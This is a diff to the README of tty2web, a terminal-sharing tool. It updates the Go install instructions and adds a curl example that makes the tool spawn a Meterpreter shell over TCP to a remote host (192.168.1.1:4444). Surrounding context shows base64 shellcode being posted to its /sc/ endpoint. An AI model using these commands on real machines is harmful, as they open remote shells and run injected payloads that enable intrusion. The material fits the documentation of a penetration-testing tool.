@@ -26,9 +26,9 @@ Download the latest stable binary file from the [Releases](https://github.com/ko
 
 (Files named with `darwin_amd64` are for Mac OS X users)
 
-## `go get` Installation (Development)
+## `go install` Installation (Development)
 
-If you have a Go language environment, you can install tty2web with the `go get` command. However, this command builds a binary file from the latest master branch, which can include unstable or breaking changes. tty2web requires go1.10 or later (dependency github.com/urfave/cli have strings.Builder).
+If you have a Go language environment, you can install tty2web with the `go install` command. However, this command builds a binary file from the latest master branch, which can include unstable or breaking changes. tty2web requires go1.16 or later (embed directive and dependency github.com/urfave/cli have strings.Builder). Also, note that you have to checkot source code and then run go install due to using forked version of pty module.
 
 ```sh
 $ git clone github.com/kost/tty2web
@@ -274,6 +274,11 @@ root
 or from file with POST parameter:
 ```sh
 $ curl -d "@sc-127.0.0.1-4444.b64"  -ivk http://127.0.0.1:8080/sc/
+```
+
+spawn Meterpreter shell over tcp to 192.168.1.1:
+```sh
+$ curl -H 'Accept-Language: msf-tcp' 'http://127.0.0.1:8080/sc/?192.168.1.1:4444'
 ```
 
 spawn Meterpreter shell over https to 192.168.1.1:
